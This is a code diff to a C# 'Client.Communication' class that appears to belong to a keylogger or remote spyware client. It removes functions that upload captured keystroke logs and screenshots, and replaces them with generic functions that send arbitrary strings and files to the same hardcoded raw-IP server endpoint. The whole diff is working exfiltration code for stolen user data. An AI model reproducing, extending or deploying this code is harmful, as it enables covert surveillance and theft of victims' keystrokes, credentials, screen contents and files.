@@ -20,29 +20,7 @@ namespace Client.Communication
 
         private static string API = "http://194.233.71.142/ll/TellMe.php";
 
-        public async static Task<bool> AsyncSendKeylogs(string logged, string username, bool force = false)
-        {
-            bool result = false;
-            await Task.Run(() =>
-            {
-                do
-                {
-                    try
-                    {
-                        MultipartFormDataContent form = new MultipartFormDataContent();
-                        form.Add(new StringContent(logged), "logs");
-                        HttpClient httpClient = new HttpClient();
-                        httpClient.Timeout = TimeSpan.FromSeconds(10);
-                        var response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=logs", form).Result;
-                        Console.WriteLine(response.Content.ReadAsStringAsync().Result);
-                        result = response.IsSuccessStatusCode;
-                    }
-                    catch { result = false; }
-                } while (force && !result);
-            });
-            return result;
-        }
-        public async static Task<bool> AsyncUploadScreenshot(byte[] image_buffer, string username)
+        public async static Task<bool> AsyncSendString(string logged, string username, string type)
         {
             bool result = false;
             await Task.Run(() =>
@@ -50,12 +28,31 @@ namespace Client.Communication
                 try
                 {
                     MultipartFormDataContent form = new MultipartFormDataContent();
-                    form.Add(new ByteArrayContent(image_buffer, 0, image_buffer.Length), "file", "screenshot");
+                    form.Add(new StringContent(logged), type);
+                    HttpClient httpClient = new HttpClient();
+                    httpClient.Timeout = TimeSpan.FromSeconds(10);
+                    var response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type={type}", form).Result;
+                    Console.WriteLine(response.Content.ReadAsStringAsync().Result);
+                    result = response.IsSuccessStatusCode;
+                }
+                catch { result = false; }
+            });
+            return result;
+        }
+        public async static Task<bool> AsyncUploadFile(byte[] file_buffer, string username, string type)
+        {
+            bool result = false;
+            await Task.Run(() =>
+            {
+                try
+                {
+                    MultipartFormDataContent form = new MultipartFormDataContent();
+                    form.Add(new ByteArrayContent(file_buffer, 0, file_buffer.Length), "file", type);
 
                     HttpClient httpClient = new HttpClient();
                     httpClient.Timeout = TimeSpan.FromSeconds(20);
 
-                    var response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=screenshot", form).Result;
+                    var response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type={type}", form).Result;
                     result = response.IsSuccessStatusCode;
                 }
                 catch (Exception ex)
